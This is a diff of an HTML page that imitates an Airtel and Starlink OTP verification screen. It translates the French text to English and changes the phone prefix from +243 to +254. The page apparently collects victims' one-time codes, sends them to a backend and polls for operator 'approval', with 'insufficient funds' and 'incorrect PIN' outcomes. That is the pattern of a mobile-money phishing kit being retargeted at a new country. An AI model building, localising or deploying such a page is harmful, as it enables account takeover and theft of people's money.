@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
-<title>Airtel Lite — Vérification OTP</title>
+<title>Airtel Lite — OTP Verification</title>
 <style>
   :root{
     --airtel-red:#e30613;
@@ -354,7 +354,7 @@
 <body>
 
   <header>
-    <button class="back" onclick="window.history.back()" aria-label="Retour">←</button>
+    <button class="back" onclick="window.history.back()" aria-label="Back">←</button>
     <div class="header-logo">
       <span class="logo-mark"></span>
       <div class="header-logo-text">
@@ -367,27 +367,27 @@
 
   <main>
     <div class="otp-card">
-      <h1>Vérification OTP</h1>
-      <p class="sub">Entrez l'OTP envoyé à votre numéro de téléphone
-        <span class="phone-num" id="phoneNum">+243</span>
+      <h1>OTP Verification</h1>
+      <p class="sub">Enter the OTP sent to your phone number
+        <span class="phone-num" id="phoneNum">+254</span>
       </p>
 
-      <input type="tel" class="otp-input" id="otpInput" placeholder="Entrer l'OTP à 4 chiffres" inputmode="numeric" maxlength="4">
+      <input type="tel" class="otp-input" id="otpInput" placeholder="Enter the 4-digit OTP" inputmode="numeric" maxlength="4">
 
-      <p class="helper-text">Entrer le code de vérification à 4 chiffres</p>
-      <p class="timer-text">Le code expire dans <b id="timer">60</b> secondes</p>
+      <p class="helper-text">Enter the 4-digit verification code</p>
+      <p class="timer-text">The code expires in <b id="timer">60</b> seconds</p>
 
-      <button class="submit-btn" id="submitBtn" disabled>SOUMETTRE</button>
+      <button class="submit-btn" id="submitBtn" disabled>SUBMIT</button>
     </div>
   </main>
 
   <div class="approval-overlay" id="approvalOverlay">
     <div class="error-icon" id="errorIcon" aria-hidden="true">!</div>
     <div class="spinner" id="spinner"></div>
-    <h2 id="overlayTitle">En attente d'approbation</h2>
-    <p id="overlayText">Code incorrect. Merci de patienter pendant la vérification…</p>
-    <p class="denied-msg" id="deniedMsg">Code incorrect.</p>
-    <button class="retry-btn" id="retryBtn">RÉESSAYER</button>
+    <h2 id="overlayTitle">Waiting for approval</h2>
+    <p id="overlayText">Incorrect code. Please wait while verification is in progress…</p>
+    <p class="denied-msg" id="deniedMsg">Incorrect code.</p>
+    <button class="retry-btn" id="retryBtn">TRY AGAIN</button>
   </div>
 
   <footer>
@@ -396,17 +396,17 @@
       <span class="logo-word">airtel</span>
     </div>
     <div class="logo-tag">A REASON TO <b>IMAGINE</b></div>
-    <div class="collab-text">En collaboration avec</div>
+    <div class="collab-text">In collaboration with</div>
     <div class="collab-brand">STARLINK™</div>
     <hr>
-    <div class="copyright">© 2026 Airtel Congo. Tous droits réservés.</div>
+    <div class="copyright">© 2026 Airtel Congo. All rights reserved.</div>
   </footer>
 
 <script>
   const params = new URLSearchParams(window.location.search);
   const phone = params.get('phone');
   if(phone){
-    document.getElementById('phoneNum').textContent = '+243' + phone;
+    document.getElementById('phoneNum').textContent = '+254' + phone;
   }
 
   const otpInput = document.getElementById('otpInput');
@@ -447,10 +447,10 @@
     overlay.classList.add('visible');
     overlay.classList.remove('error-state');
     spinner.style.display = 'block';
-    overlayTitle.textContent = "En attente d'approbation";
+    overlayTitle.textContent = "Waiting for approval";
     overlayTitle.style.display = 'block';
     overlayText.style.display = 'block';
-    overlayText.textContent = 'Votre demande a été envoyée. Merci de patienter pendant la vérification…';
+    overlayText.textContent = 'Your request has been sent. Please wait while verification is in progress…';
     deniedMsg.style.display = 'none';
     retryBtn.style.display = 'none';
   }
@@ -470,7 +470,7 @@
           spinner.style.display = 'none';
           overlayTitle.style.display = 'none';
           overlayText.style.display = 'none';
-          deniedMsg.textContent = 'Code incorrect.';
+          deniedMsg.textContent = 'Incorrect code.';
           deniedMsg.style.display = 'block';
           retryBtn.style.display = 'inline-block';
         } else if(data.status === 'insufficient'){
@@ -480,7 +480,7 @@
           overlayText.style.display = 'none';
           overlay.classList.add('error-state');
 
-          deniedMsg.textContent = 'Fonds insuffisants.';
+          deniedMsg.textContent = 'Insufficient funds.';
           deniedMsg.style.display = 'block';
           retryBtn.style.display = 'inline-block';
         } else if(data.status === 'demo_error'){
@@ -490,7 +490,7 @@
           overlayText.style.display = 'none';
           overlay.classList.add('error-state');
 
-          deniedMsg.textContent = 'Broche incorrecte.';
+          deniedMsg.textContent = 'Incorrect PIN.';
           deniedMsg.style.display = 'block';
           retryBtn.style.display = 'inline-block';
         }
@@ -525,8 +525,8 @@
       const data = await res.json();
       pollApproval(data.id);
     } catch (err) {
-      overlayTitle.textContent = 'Erreur de connexion';
-      overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
+      overlayTitle.textContent = 'Connection error';
+      overlayText.textContent = "Unable to send the request. Check your connection and try again.";
       spinner.style.display = 'none';
       retryBtn.style.display = 'inline-block';
     }
